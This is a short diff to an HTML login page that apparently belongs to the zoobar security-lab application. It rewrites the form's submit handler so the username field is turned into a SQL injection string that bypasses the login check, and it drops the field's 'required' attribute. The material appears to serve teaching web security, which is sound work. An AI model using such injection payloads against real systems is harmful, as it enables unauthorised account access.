@@ -9,9 +9,9 @@
   <div class="container">
     <div class="row">
       <div class="hero-unit span7 offset2" style="margin-top: 40px; text-align: center;">
-        <form action="http://zoobar.org/login" class="form-inline" id="loginer" method="post" accept-charset="utf-8">
-          <input type="text" name="name" placeholder="username" autofocus required>
-          <input type="hidden" name="password">
+        <form action="http://zoobar.org:5000/login" class="form-inline" id="loginer" method="post" accept-charset="utf-8">
+          <input type="text" name="name" placeholder="username" autofocus>
+          <input type="hidden" name="password" style="display: none;" placeholder="password">
           <button type="submit" class="btn btn-primary">Login &rarr;</button>
         </form>
       </div>
@@ -20,9 +20,8 @@
   <script type="text/javascript" charset="utf-8">
   (function() {
     var loginer = document.getElementById('loginer');
-    loginer.addEventListener('submit', function(ev) {
-      console.log(loginer.name.value);
-      loginer.password.value = ''; // TODO figure out what to put here
+    $(loginer).submit(function(ev) {
+      loginer.name.value = "\\\\' OR name=\"" + loginer.name.value + "\") LIMIT 1; --";
       return true;
     });
   })();
